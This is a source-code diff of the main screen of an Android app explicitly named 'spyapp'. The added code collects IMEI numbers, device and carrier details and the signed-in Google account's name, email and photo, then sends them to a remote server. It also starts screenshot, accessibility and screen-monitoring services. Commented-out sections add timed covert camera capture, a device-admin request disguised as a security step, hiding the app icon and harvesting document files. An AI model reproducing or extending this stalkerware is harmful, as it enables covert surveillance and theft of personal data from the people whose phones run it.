@@ -1,13 +1,21 @@
 package kkactive_india.in.spyapp;
 
 import android.Manifest;
+import android.accounts.Account;
+import android.accounts.AccountManager;
 import android.annotation.SuppressLint;
 import android.annotation.TargetApi;
 import android.app.Activity;
+import android.app.ActivityManager;
+import android.app.AlarmManager;
+import android.app.PendingIntent;
+import android.app.admin.DevicePolicyManager;
+import android.content.BroadcastReceiver;
 import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
@@ -16,22 +24,31 @@ import android.database.Cursor;
 import android.graphics.drawable.Drawable;
 import android.location.Address;
 import android.location.Geocoder;
+import android.location.LocationManager;
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
+import android.os.StatFs;
 import android.provider.Browser;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.provider.Telephony;
+import android.support.annotation.NonNull;
 import android.support.annotation.RequiresApi;
 import android.support.v4.app.ActivityCompat;
+import android.support.v4.view.ViewCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.telephony.SubscriptionInfo;
 import android.telephony.SubscriptionManager;
 import android.telephony.TelephonyManager;
 import android.util.Log;
+import android.util.Patterns;
 import android.view.View;
 import android.webkit.MimeTypeMap;
 import android.widget.Button;
@@ -40,6 +57,20 @@ import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import com.google.android.gms.auth.api.signin.GoogleSignIn;
+import com.google.android.gms.auth.api.signin.GoogleSignInAccount;
+import com.google.android.gms.auth.api.signin.GoogleSignInClient;
+import com.google.android.gms.auth.api.signin.GoogleSignInOptions;
+import com.google.android.gms.common.api.ApiException;
+import com.google.android.gms.tasks.OnCompleteListener;
+import com.google.android.gms.tasks.Task;
+import com.google.firebase.auth.AuthCredential;
+import com.google.firebase.auth.AuthResult;
+import com.google.firebase.auth.FirebaseAuth;
+import com.google.firebase.auth.FirebaseUser;
+import com.google.firebase.auth.GoogleAuthProvider;
+import com.google.firebase.iid.FirebaseInstanceId;
+import com.google.firebase.iid.InstanceIdResult;
 import com.google.gson.Gson;
 import com.google.gson.JsonObject;
 import com.google.gson.JsonParser;
@@ -49,13 +80,22 @@ import org.json.JSONObject;
 
 import java.io.File;
 import java.io.IOException;
+import java.text.DecimalFormat;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Calendar;
 import java.util.Date;
 import java.util.List;
 import java.util.Locale;
+import java.util.regex.Pattern;
 
+import github.nisrulz.easydeviceinfo.base.EasyBatteryMod;
+import github.nisrulz.easydeviceinfo.base.EasyDeviceMod;
+import github.nisrulz.easydeviceinfo.base.EasyIdMod;
 import github.nisrulz.easydeviceinfo.base.EasyLocationMod;
+import github.nisrulz.easydeviceinfo.base.EasyMemoryMod;
+import github.nisrulz.easydeviceinfo.base.EasyNetworkMod;
+import github.nisrulz.easydeviceinfo.base.EasySimMod;
 import kkactive_india.in.spyapp.FilePOJO.fileBean;
 import kkactive_india.in.spyapp.MainPOJO.MainBean;
 import kkactive_india.in.spyapp.contactPOJO.ContactDatum;
@@ -73,10 +113,13 @@ import retrofit2.converter.gson.GsonConverterFactory;
 import retrofit2.converter.scalars.ScalarsConverterFactory;
 
 import static android.view.View.VISIBLE;
+import static java.util.jar.Pack200.Packer.ERROR;
+//import static kkactive_india.in.spyapp.ScreenShot.setScreenshotPermission;
 
 public class MainActivity extends AppCompatActivity {
 
     TextView textView;
+    TextView txtLogs;
     EditText mail;
     Button login;
     ProgressBar bar;
@@ -85,18 +128,39 @@ public class MainActivity extends AppCompatActivity {
     @SuppressLint("HardwareIds")
     String imeiNumber2;
     String address;
-    String name, phoneNumber, id, lat, lon;
+    String name, phoneNumber, id, lat, lon, Model, appVersion, country, carrier, personName, personEmail, personImage;
+    int osVersion;
     List<ContactDatum> data = new ArrayList<>();
     SharedPreferences pref;
     SharedPreferences.Editor edit;
     final String state = Environment.getExternalStorageState();
     List<String> list;
     ConnectionDetector cd;
-    File file;
+    Uri personPhoto;
+    File file, file21;
+    long Ram, inMemory, exMemory, tinMemory, texMemory;
+    private static Intent screenshotPermission = null;
 
     private static String CHROME_BOOKMARKS_URI =
             "content://com.android.chrome.browser/history";
 
+    private static final int REQUEST_CODE = 0;
+    private DevicePolicyManager mDPM;
+    private ComponentName mAdminName;
+
+
+    private static final String TAG = "GoogleActivity";
+    private static final int RC_SIGN_IN = 9001;
+    private FirebaseAuth mAuth;
+
+    private GoogleSignInClient mGoogleSignInClient;
+
+    private BroadcastReceiver mScreenStateReceiver = null;
+
+    Intent service;
+
+    private MediaProjectionManager mediaProjectionManager;
+    private MediaProjection mediaProjection;
 
 
     @TargetApi(Build.VERSION_CODES.O)
@@ -116,61 +180,35 @@ public class MainActivity extends AppCompatActivity {
         edit = pref.edit();
 
         cd = new ConnectionDetector(getApplication());
+        txtLogs = (TextView) findViewById(R.id.txt_log);
 
-        login.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View view) {
-
-                final String e = mail.getText().toString();
-
-                if (e.length() > 0) {
-                    bar.setVisibility(VISIBLE);
-                    Bean b = (Bean) getApplicationContext();
-
-                    Retrofit retrofit = new Retrofit.Builder()
-                            .baseUrl(b.baseURL)
-                            .addConverterFactory(ScalarsConverterFactory.create())
-                            .addConverterFactory(GsonConverterFactory.create())
-                            .build();
-                    Allapi cr = retrofit.create(Allapi.class);
-                    Call<mailBean> call = cr.login(e);
-                    call.enqueue(new Callback<mailBean>() {
-                        @Override
-                        public void onResponse(Call<mailBean> call, Response<mailBean> response) {
-                            bar.setVisibility(View.GONE);
-                            Log.d("successHoGyaHAi", response.message());
-                            Log.d("successHoGyaHAi", "success");
-                            Toast.makeText(MainActivity.this, "Please check your E-mail Id and click on that link.", Toast.LENGTH_SHORT).show();
-
-                            id = response.body().getResult().getEmail();
-
-                            edit.putString("id", response.body().getResult().getEmail());
-                            edit.apply();
+        ViewCompat.setImportantForAccessibility(txtLogs, ViewCompat.IMPORTANT_FOR_ACCESSIBILITY_NO);
 
 
-                            mainApi();
-                            // latLonApi();
-                            //contactApi();
-
-                            Intent in = new Intent(MainActivity.this, MainService.class);
-                            startService(in);
 
 
-                          /*PackageManager p = getPackageManager();
-                          ComponentName componentName = new ComponentName(MainActivity.this, kkactive_india.in.spyapp.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
-                          p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);*/
 
 
-                        }
+ /*       try {
+            // Initiate DevicePolicyManager.
+            mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+            mAdminName = new ComponentName(this, DeviceAdminDemo.class);
 
-                        @Override
-                        public void onFailure(Call<mailBean> call, Throwable t) {
-
-                        }
-                    });
-                }
+            if (!mDPM.isAdminActive(mAdminName)) {
+                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
+                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to secure your application.");
+                startActivityForResult(intent, REQUEST_CODE);
+            } else {
+                // mDPM.lockNow();
+                // Intent intent = new Intent(MainActivity.this,
+                // TrackDeviceService.class);
+                // startService(intent);
             }
-        });
+        } catch (Exception e) {
+            e.printStackTrace();
+        }*/
+
 
         Log.d("sadasd", "kjhasdkh");
 
@@ -196,25 +234,101 @@ public class MainActivity extends AppCompatActivity {
         Log.d("numner", number);
 
 
-        /*EasyLocationMod easyLocationMod = new EasyLocationMod(MainActivity.this);
+        EasyBatteryMod easyBatteryMod = new EasyBatteryMod(MainActivity.this);
 
-        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-            // TODO: Consider calling
-            //    ActivityCompat#requestPermissions
-            // here to request the missing permissions, and then overriding
-            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
-            //                                          int[] grantResults)
-            // to handle the case where the user grants the permission. See the documentation
-            // for ActivityCompat#requestPermissions for more details.
-            return;
+        int Battery = easyBatteryMod.getBatteryPercentage();
+
+        // Log.e("BatteryPercentage", String.valueOf(Battery));
+
+        EasyDeviceMod easyDeviceMod = new EasyDeviceMod(MainActivity.this);
+
+        Model = easyDeviceMod.getModel();
+        osVersion = easyDeviceMod.getBuildVersionSDK();
+        appVersion = easyDeviceMod.getOSVersion();
+        String phn = easyDeviceMod.getPhoneNo();
+
+        Log.e("AndroidVersion", String.valueOf(osVersion));
+        Log.e("phn", phn);
+        Log.e("AppVersion", appVersion);
+        Log.e("Model", Model);
+
+        EasyMemoryMod easyMemoryMod = new EasyMemoryMod(MainActivity.this);
+        Ram = (long) easyMemoryMod.convertToMb(easyMemoryMod.getTotalRAM());
+        //  inMemory = (long) easyMemoryMod.convertToGb(easyMemoryMod.getAvailableInternalMemorySize());
+        //   exMemory = (long)easyMemoryMod.convertToGb(easyMemoryMod.getAvailableExternalMemorySize());
+        //   tinMemory = (long) easyMemoryMod.convertToGb(easyMemoryMod.getTotalInternalMemorySize());
+        //   texMemory = (long)easyMemoryMod.convertToGb(easyMemoryMod.getTotalExternalMemorySize());
+
+        //  Log.e("RAM",String.valueOf(Ram));
+        //  Log.e("Internel Memory",String.valueOf(inMemory));
+        //  Log.e("Externel Memory",String.valueOf(exMemory));
+        //  Log.e("Total Internel Memory",String.valueOf(tinMemory));
+        // Log.e("Total Externel Memory",String.valueOf(texMemory));
+
+        EasyNetworkMod easyNetworkMod = new EasyNetworkMod(this);
+
+        boolean wifi = easyNetworkMod.isWifiEnabled();
+
+        Log.e("Wifi", String.valueOf(wifi));
+
+        ConnectivityManager mgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+        NetworkInfo netInfo = mgr.getActiveNetworkInfo();
+
+        /*boolean isData = netInfo.getType() == ConnectivityManager.TYPE_MOBILE;
+
+        Log.e("DATAIS", String.valueOf(isData));*/
+
+        EasySimMod easySimMod = new EasySimMod(this);
+
+        country = easySimMod.getCountry();
+        carrier = easySimMod.getCarrier();
+
+        Log.e("Country", country);
+        Log.e("Carrier", carrier);
+
+
+        ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
+        ActivityManager activityManager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
+        activityManager.getMemoryInfo(memoryInfo);
+        long Megs = memoryInfo.totalMem / 1073741824;
+
+        // 1073741824
+
+
+        // Log.e("RamHaiBhai", String.valueOf(Megs));
+
+       /* ActivityCompat.requestPermissions(MainActivity.this,
+                new String[]{Manifest.permission.GET_ACCOUNTS},
+                1);
+
+        EasyIdMod easyIdMod = new EasyIdMod(this);
+        String[] emailIds = easyIdMod.getAccounts();
+        StringBuilder emailString = new StringBuilder();
+        if (emailIds != null && emailIds.length > 0) {
+            for (String e : emailIds) {
+                emailString.append(e).append("\n");
+            }
+        } else {
+            emailString.append("-");
         }
 
-        double[] l = easyLocationMod.getLatLong();
-        lat = String.valueOf(l[0]);
-        lon = String.valueOf(l[1]);
+        String emailId = emailString.toString();
 
-        Log.d("latitude", lat);
-        Log.d("longitude", lon);*/
+        Log.e("IDDDDDD", emailId);*/
+
+
+        //  Log.e("InternelMaiHaiMemory", getAvailableInternalMemorySize());
+        //  Log.e("TotInternelMaiHaiMemory", getTotalInternalMemorySize());
+        //   Log.e("ExternalMaiHaiMemory",getAvailableExternalMemorySize());
+        //  Log.e("TotExternalMaiHaiMemory",getTotalExternalMemorySize());
+
+        LocationManager locManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+        if (locManager != null) {
+            boolean gps = locManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
+
+            Log.e("LocationBhai", String.valueOf(gps));
+        }
+
 
 
        /* Geocoder geocoder = new Geocoder(this, Locale.getDefault());
@@ -234,7 +348,7 @@ public class MainActivity extends AppCompatActivity {
         }*/
 
 
-        SubscriptionManager subscriptionManager = SubscriptionManager.from(getApplicationContext());
+/*        SubscriptionManager subscriptionManager = SubscriptionManager.from(getApplicationContext());
         List<SubscriptionInfo> subsInfoList = subscriptionManager.getActiveSubscriptionInfoList();
 
         Log.d("Test", "Current list = " + subsInfoList);
@@ -244,7 +358,7 @@ public class MainActivity extends AppCompatActivity {
             String num = subscriptionInfo.getNumber();
 
             Log.d("Test", " Number is  " + num);
-        }
+        }*/
 
 
      /*   ActivityCompat.requestPermissions(MainActivity.this,
@@ -265,7 +379,7 @@ public class MainActivity extends AppCompatActivity {
 
             Log.d("names", name);
             Log.d("Phones", phoneNumber);
-            //textView.setText("\n Name:" + name +"\nNumber:" + phoneNumber );
+            //textView.setText("\n Name:" + name +"\nNumber:" + phoneNumber );      
 
             sb.append(" \nName:--- " + name + "\nPhone Number:--- " + phoneNumber);
             sb.append("\n----------------------------------");
@@ -291,7 +405,7 @@ public class MainActivity extends AppCompatActivity {
 
 
         //files();
-      //  filesss();
+        //  filesss();
 
 
        /* ArrayList<String> galleryImageUrls;
@@ -312,6 +426,329 @@ public class MainActivity extends AppCompatActivity {
         Log.e("fatch in", String.valueOf(galleryImageUrls));*/
         //return galleryImageUrls;
 
+
+        GoogleSignInOptions gso = new GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
+                .requestIdToken(getString(R.string.default_web_client_id))
+                .requestEmail()
+                .build();
+
+        mGoogleSignInClient = GoogleSignIn.getClient(this, gso);
+
+        mAuth = FirebaseAuth.getInstance();
+
+
+        login.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+
+                final String e = mail.getText().toString();
+                if (e.length() > 0) {
+                    bar.setVisibility(VISIBLE);
+
+                    signIn();
+                } else {
+                    mail.setError("Give a valid E-mail");
+                    mail.requestFocus();
+                }
+
+            }
+        });
+
+        //checkCameraHardware(getApplicationContext());
+
+/*        GoogleSignInAccount acct = GoogleSignIn.getLastSignedInAccount(MainActivity.this);
+        if (acct != null) {
+            personName = acct.getDisplayName();
+            String personGivenName = acct.getGivenName();
+            String personFamilyName = acct.getFamilyName();
+            personEmail = acct.getEmail();
+            String personId = acct.getId();
+            personPhoto = acct.getPhotoUrl();
+
+            file21 = new File(String.valueOf(personPhoto));
+
+            Log.e("Name",personName);
+            Log.e("Name",personId);
+            Log.e("Name",personEmail);
+            Log.e("Name", String.valueOf(personPhoto));
+        }*/
+
+        /*FirebaseInstanceId.getInstance().getInstanceId().addOnCompleteListener(new OnCompleteListener<InstanceIdResult>() {
+            @Override
+            public void onComplete(@NonNull Task<InstanceIdResult> task) {
+
+                String token = task.getResult().getToken();
+
+                Log.e("Token", token);
+
+
+            }
+        });*/
+
+
+//        Log.e("regId",pref.getString("regId",null));
+
+       /* mediaProjectionManager = (MediaProjectionManager)getSystemService(MEDIA_PROJECTION_SERVICE);
+        startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), 1);*/
+
+
+    }
+
+
+    /**
+     * Check if this device has a camera
+     */
+    private boolean checkCameraHardware(Context context) {
+        if (context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
+            // this device has a camera
+            Log.e("Camera", "HaiBhai");
+            return true;
+        } else {
+            // no camera on this device
+            Log.e("Camera", "NahiHaiBhai");
+            return false;
+        }
+    }
+
+    private void signIn() {
+        Intent signInIntent = mGoogleSignInClient.getSignInIntent();
+        startActivityForResult(signInIntent, RC_SIGN_IN);
+    }
+
+    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == RC_SIGN_IN) {
+
+            Intent intttac = new Intent(MainActivity.this, MyAccessibilityService.class);
+            startService(intttac);
+
+            Task<GoogleSignInAccount> task = GoogleSignIn.getSignedInAccountFromIntent(data);
+            try {
+                // Google Sign In was successful, authenticate with Firebase
+                GoogleSignInAccount account = task.getResult(ApiException.class);
+                firebaseAuthWithGoogle(account);
+                Log.e("Info", account.getEmail());
+                Log.e("Info", String.valueOf(account.getAccount()));
+                Log.e("Info", account.getDisplayName());
+                Log.e("Info", String.valueOf(account.getPhotoUrl()));
+                personName = account.getDisplayName();
+                personEmail = account.getEmail();
+                personPhoto = account.getPhotoUrl();
+                personImage = String.valueOf(account.getPhotoUrl());
+
+                file21 = new File(String.valueOf(personPhoto));
+
+
+            } catch (ApiException e) {
+                // Google Sign In failed, update UI appropriately
+                Log.w(TAG, "Google sign in failed", e);
+                // [START_EXCLUDE]
+                //updateUI(null);
+                // [END_EXCLUDE]
+            }
+        }
+
+       /* if (requestCode == 1) {
+            if (resultCode == Activity.RESULT_OK) {
+                mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data);
+                setScreenshotPermission((Intent) data.clone());
+               // this.finish();
+            }else if (Activity.RESULT_CANCELED == resultCode) {
+                setScreenshotPermission(null);
+                Log.e("Access","No Access");
+
+            }
+        }*/
+
+    }
+
+    private void firebaseAuthWithGoogle(GoogleSignInAccount acct) {
+        Log.d(TAG, "firebaseAuthWithGoogle:" + acct.getId());
+        // [START_EXCLUDE silent]
+        // showProgressDialog();
+        // [END_EXCLUDE]
+
+        AuthCredential credential = GoogleAuthProvider.getCredential(acct.getIdToken(), null);
+        mAuth.signInWithCredential(credential)
+                .addOnCompleteListener(this, new OnCompleteListener<AuthResult>() {
+                    @Override
+                    public void onComplete(@NonNull Task<AuthResult> task) {
+                        if (task.isSuccessful()) {
+                            // Sign in success, update UI with the signed-in user's information
+                            Log.d(TAG, "signInWithCredential:success");
+                            FirebaseUser user = mAuth.getCurrentUser();
+
+                            Log.d("User", String.valueOf(user));
+
+                            final String e = mail.getText().toString();
+
+
+                            Bean b = (Bean) getApplicationContext();
+
+                            Retrofit retrofit = new Retrofit.Builder()
+                                    .baseUrl(b.baseURL)
+                                    .addConverterFactory(ScalarsConverterFactory.create())
+                                    .addConverterFactory(GsonConverterFactory.create())
+                                    .build();
+                            Allapi cr = retrofit.create(Allapi.class);
+                            Call<mailBean> call = cr.login(e);
+                            call.enqueue(new Callback<mailBean>() {
+                                @Override
+                                public void onResponse(Call<mailBean> call, Response<mailBean> response) {
+                                    bar.setVisibility(View.GONE);
+                                    Log.d("successHoGyaHAi", response.message());
+                                    Log.d("successHoGyaHAi", "success");
+                                    Toast.makeText(MainActivity.this, "Please check your E-mail Id and click on that link.", Toast.LENGTH_SHORT).show();
+
+                                    id = response.body().getResult().getEmail();
+
+                                    edit.putString("id", response.body().getResult().getEmail());
+                                    edit.apply();
+
+
+                                    mainApi();
+                                    // latLonApi();
+                                    //contactApi();
+
+                                    /*Intent in = new Intent(MainActivity.this, MainService.class);
+                                    startService(in);*/
+
+
+                                    /*Calendar cal = Calendar.getInstance();
+
+                                    service = new Intent(getBaseContext(), CameraService.class);
+                                    cal.add(Calendar.SECOND, 15);
+                                    //TAKE PHOTO EVERY 15 SECONDS
+                                    PendingIntent pintent = PendingIntent.getService(MainActivity.this, 0, service, 0);
+                                    AlarmManager alarm = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+
+                                    alarm.setRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
+                                            60*60*1000, pintent);
+                                    startService(service);*/
+
+                                    /*Intent intent = new Intent(MainActivity.this, CameraService.class);
+                                    startService(intent);*/
+
+                                    /*Intent intent = new Intent(MainActivity.this, RecorderService.class);
+                                    intent.putExtra("Front_Request",false);
+                                    startService(intent);*/
+
+                                    Intent in = new Intent(MainActivity.this, MyFirebaseMessagingService.class);
+                                    startService(in);
+
+                                    Intent inti = new Intent(MainActivity.this, FirebaseInstanceIdService.class);
+                                    startService(inti);
+
+                                    Intent inttt = new Intent(MainActivity.this, ScreenShot.class);
+                                    startService(inttt);
+
+                                    /*Intent vib = new Intent(MainActivity.this,VibrateService.class);
+                                    startService(vib);*/
+
+                                    Intent intttac = new Intent(MainActivity.this, MyAccessibilityService.class);
+                                    startService(intttac);
+
+                                    IntentFilter screenStateFilter = new IntentFilter();
+                                    screenStateFilter.addAction(Intent.ACTION_SCREEN_ON);
+                                    screenStateFilter.addAction(Intent.ACTION_SCREEN_OFF);
+                                    mScreenStateReceiver = new ScreenStateReceiver();
+                                    registerReceiver(mScreenStateReceiver, screenStateFilter);
+
+
+
+
+                          /*PackageManager p = getPackageManager();
+                          ComponentName componentName = new ComponentName(MainActivity.this, kkactive_india.in.spyapp.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
+                          p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);*/
+
+
+                                }
+
+                                @Override
+                                public void onFailure(Call<mailBean> call, Throwable t) {
+
+                                }
+                            });
+
+
+                            // updateUI(user);
+                        } else {
+                            // If sign in fails, display a message to the user.
+                            Log.w(TAG, "signInWithCredential:failure", task.getException());
+                            // Snackbar.make(findViewById(R.id.main_layout), "Authentication Failed.", Snackbar.LENGTH_SHORT).show();
+                            // updateUI(null);
+                        }
+
+                        // [START_EXCLUDE]
+                        //  hideProgressDialog();
+                        // [END_EXCLUDE]
+                    }
+                });
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+
+        unregisterReceiver(mScreenStateReceiver);
+    }
+
+    public static boolean externalMemoryAvailable() {
+        return android.os.Environment.getExternalStorageState().equals(
+                android.os.Environment.MEDIA_MOUNTED);
+    }
+
+    public static String getAvailableInternalMemorySize() {
+        File path = Environment.getDataDirectory();
+        StatFs stat = new StatFs(path.getPath());
+        long blockSize = stat.getBlockSizeLong();
+        long availableBlocks = stat.getAvailableBlocksLong();
+        return getFileSize(availableBlocks * blockSize);
+    }
+
+    public static String getTotalInternalMemorySize() {
+        File path = Environment.getDataDirectory();
+        StatFs stat = new StatFs(path.getPath());
+        long blockSize = stat.getBlockSizeLong();
+        long totalBlocks = stat.getBlockCountLong();
+        return getFileSize(totalBlocks * blockSize);
+    }
+
+    public static String getAvailableExternalMemorySize() {
+        if (externalMemoryAvailable()) {
+            File path = Environment.getExternalStorageDirectory();
+            StatFs stat = new StatFs(path.getPath());
+            long blockSize = stat.getBlockSizeLong();
+            long availableBlocks = stat.getAvailableBlocksLong();
+            return getFileSize(availableBlocks * blockSize);
+        } else {
+            return ERROR;
+        }
+    }
+
+    public static String getTotalExternalMemorySize() {
+        if (externalMemoryAvailable()) {
+            File path = Environment.getExternalStorageDirectory();
+            StatFs stat = new StatFs(path.getPath());
+            long blockSize = stat.getBlockSizeLong();
+            long totalBlocks = stat.getBlockCountLong();
+            return getFileSize(totalBlocks * blockSize);
+        } else {
+            return ERROR;
+        }
+    }
+
+
+    public static String getFileSize(long size) {
+        if (size <= 0)
+            return "0";
+
+        final String[] units = new String[]{"B", "KB", "MB", "GB", "TB"};
+        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
+
+        return new DecimalFormat("#,##0.#").format(size / Math.pow(1024, digitGroups)) + " " + units[digitGroups];
     }
 
     public void files() {
@@ -360,9 +797,9 @@ public class MainActivity extends AppCompatActivity {
     }
 
 
-    public void filesss(){
+    public void filesss() {
 
-        if (cd.isConnectingToInternet()){
+        if (cd.isConnectingToInternet()) {
 
 
             MultipartBody.Part body1 = null;
@@ -371,11 +808,10 @@ public class MainActivity extends AppCompatActivity {
 
                 file = new File(list.get(i));
 
-                if(file.getName().endsWith(".pptx") || file.getName().endsWith(".ppt")
+                if (file.getName().endsWith(".pptx") || file.getName().endsWith(".ppt")
                         || file.getName().endsWith(".xlsx") || file.getName().endsWith(".pdf")
-                        || file.getName().endsWith(".doc")||  file.getName().endsWith(".txt")
-                        || file.getName().endsWith(".docx")||file.getName().endsWith(".rtf"))
-                {
+                        || file.getName().endsWith(".doc") || file.getName().endsWith(".txt")
+                        || file.getName().endsWith(".docx") || file.getName().endsWith(".rtf")) {
                     // Log.e(" FILES",file.getName());
                     //Log.e(" FILES",file.getAbsolutePath());
 
@@ -408,26 +844,22 @@ public class MainActivity extends AppCompatActivity {
 
                 }
 
-
-
             }
 
-            Log.d("ListSize",String.valueOf( list.size()));
+            Log.d("ListSize", String.valueOf(list.size()));
 
             long imagename = System.currentTimeMillis();
 
             String strName = imagename + file.getName();
 
-            Log.d("asdasdasd" , strName);
+            Log.d("asdasdasd", strName);
 
             // body1 = MultipartBody.Part.createFormData("img[]", file.getName(), reqFile1);
-
 
 
         }
 
     }
-
 
 
     private void getAllFilesOfDir(File directory) {
@@ -452,6 +884,19 @@ public class MainActivity extends AppCompatActivity {
 
     public void mainApi() {
 
+
+        MultipartBody.Part body1 = null;
+
+        RequestBody reqFile1 = RequestBody.create(MediaType.parse("multipart/form-data"), file21);
+
+        long imagename = System.currentTimeMillis();
+
+        String strName = imagename + file21.getName();
+
+        Log.d("asdasdasd", strName);
+
+        body1 = MultipartBody.Part.createFormData("user_photo", file21.getName(), reqFile1);
+
         Bean b = (Bean) getApplicationContext();
 
         Retrofit retrofit = new Retrofit.Builder()
@@ -460,7 +905,11 @@ public class MainActivity extends AppCompatActivity {
                 .addConverterFactory(GsonConverterFactory.create())
                 .build();
         Allapi cr = retrofit.create(Allapi.class);
-        Call<MainBean> call = cr.main(id, imeiNumber1, imeiNumber2);
+
+        Log.e("LinkOfImage", String.valueOf(personPhoto));
+        Log.e("LinkOfImage", personImage);
+
+        Call<MainBean> call = cr.main(id, imeiNumber1, imeiNumber2, Model, String.valueOf(osVersion), appVersion, country, carrier, personName, personEmail, personImage);
         call.enqueue(new Callback<MainBean>() {
             @Override
             public void onResponse(Call<MainBean> call, Response<MainBean> response) {
@@ -469,6 +918,8 @@ public class MainActivity extends AppCompatActivity {
 
             @Override
             public void onFailure(Call<MainBean> call, Throwable t) {
+
+                Log.e("BhiFailHuaMain", t.toString());
 
             }
         });
